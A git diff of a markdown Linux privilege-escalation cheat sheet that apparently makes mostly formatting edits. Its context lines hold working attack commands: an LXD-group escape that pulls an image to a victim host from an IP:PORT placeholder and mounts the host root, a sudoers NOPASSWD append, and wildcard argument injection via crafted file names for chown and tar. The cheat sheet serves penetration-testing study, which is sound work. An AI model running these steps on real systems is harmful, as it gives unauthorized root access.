@@ -133,7 +133,7 @@ sudo su
 ##### LXD & LXC
 
 **Linux Container (LXC)** are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine.
-It creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
+It creates an environment as close as possible to a Linux installation but without the need for a separate kernel.<br>
 **Linux daemon (LXD)** is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.
 
 When you are part of the LXD group, you can initialize the LXD process
@@ -146,18 +146,21 @@ sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools # Install the
 go get -d -v github.com/lxc/distrobuilder # Clone distrobuilder repo
 cd $HOME/go/src/github.com/lxc/distrobuilder # Get to the make folder for distrobuilder
 make # Make it
+
 # Prepare the creation of alpine (still on your own computer)
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml # Create the LXD container using distrobuilder
 # You will have then a lxd.tar.xz file and a rootfs.squashfs file
+
 # Upload them to the victim host
 wget http://IP:PORT/lxd.tar.xz
 wget http://IP:PORT/rootfs.squashfs
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine # Import an image using the META file (lxd.tar.xz) and ROOTFS file (rootfs.squashfs)
 lxc init alpine thomasd -c security.privileged=true # Create a container called thomasd from images alpline and give a configuration parameter to run the instance in privileged mode
 lxc list # Verify that the container thomasd exist
+
 lxc config device add thomasd host-root disk source=/ path=/mnt/root recursive=true # Add an extra device which mount "/" within the instance to the "thomasd" container  
 lxc start thomasd # Run the container thomasd
 lxc exec thomasd /bin/sh
@@ -178,7 +181,7 @@ find / -perm -g=s -type f -print 2>/dev/null | sed 's:.*/::'  # Search for progr
 
 ###### *If you don't know, now you know: [SUID & SGID]()*
 
-- **SUID** (**S**et owner **U**ser **ID** up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs
+- **SUID** (**S**et owner **U**ser **ID** up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs.
 - **SGID** (**S**et owner **G**roup **ID** up on execution) same as SUID for groups.
 
 
@@ -195,7 +198,7 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 
 The /etc/sudoers file controls who can run what commands as what users on what machines and can also control special things such as whether you need a password for particular commands.
 
-You can use **PASSWD** and **NOPASSWD** to specify whether the user has to enter a password or not
+You can use **PASSWD** and **NOPASSWD** to specify whether the user has to enter a password or not.
 
 #### Files Enumeration 
 
@@ -223,10 +226,10 @@ locate password | more
   john --worldlist/rockyou.txt *file.john*
   ```
 - **authorized_keys**
-  OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.
+  OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.<br>
   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process
 
-- **/etc/security/opasswd**: File with password history (pam_pwhistory)
+- **/etc/security/opasswd**: File with password history (pam_pwhistory).
 
 ##### All Files/Folder
 
@@ -288,30 +291,32 @@ If you notice '.' in environment PATH variable it means that the logged user can
 
 ###### *If you don't know, now you know: [PATH]()*
 
-PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.
+PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.<br>
 When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. 
 
 ### Wildcard
 
-When you provide **--** followed by two spaces, it instructs the program to stop interpret command line argument
+When you provide **--** followed by two spaces, it instructs the program to stop interpret command line argument.
 
 #### Chown/Chmod file reference 
 
-Here we gonna use the **--reference=FILE** parameter that use the given *file*'s owner and group rather than specifying OWNER:GROUP values
+Here we wil use the **--reference=FILE** parameter that use the given *file*'s owner and group rather than specifying OWNER:GROUP values.
 
 ```bash
 touch -- --reference=.thomas.txt
 chown -R * .txt # This wil
 ```
 
-Here below is an example
+Here below is an example:
 
 ```bash
 # Create:
 # - One file called ".thomas.txt" that belong to me
 # - One filed called "--reference=.thomas.txt" which will be used as a reference parameter
+
 kali@kali:/example$ touch .thomas.txt
 kali@kali:/example$ touch -- --reference=.thomas.txt
+
 # You can see that all files, except the two I created belongs to root
 kali@kali:/example$ ls -all
 total 44
@@ -322,9 +327,11 @@ drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
 -rw-r--r--  1 root root     0 Nov 20 11:41  file3.txt
 -rw-r--r--  1 kali kali     0 Nov 20 11:41 '--reference=.thomas.txt'
 -rw-r--r--  1 kali kali     0 Nov 20 11:41  .thomas.txt
+
 # Let's connect as root and decide that ALL files within the directory 
 # should belong to the user and group root
 root@kali:/example# chown -R root:root * 2>/dev/null
+
 # And we can see that it took the "--reference=.thomas.txt" via the '*' and assigned all the files to the user kali
 root@kali:/example# ls -all
 total 44
@@ -340,6 +347,8 @@ drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
 This works with chmod as well.
 
 #### Tar arbitrary command execution
+
+> / / / To Finish / / /
 
 ```bash
 touch -- --checkpoint=1 # Create a file named --checkpoint=1
@@ -383,9 +392,10 @@ Some capabilities to look for are:
 
 ### D-Bus Enumeration 
 
-**D-Bus** is an IPC mechanism initially designed to replace the software component communications systems used by the GNOME and KDE Linux desktop environments
+**D-Bus** is an IPC mechanism initially designed to replace the software component communications systems used by the GNOME and KDE Linux desktop environments.
 
-Each service is defined by the **objects** and **interfaces** that it exposes. We can think of objects as instances of classes in standard OOP languages.
+Each service is defined by the **objects** and **interfaces** that it exposes.<br>
+We can think of objects as instances of classes in standard OOP languages.
 
 ```bash
 busctl list # List D-Bus interfaces
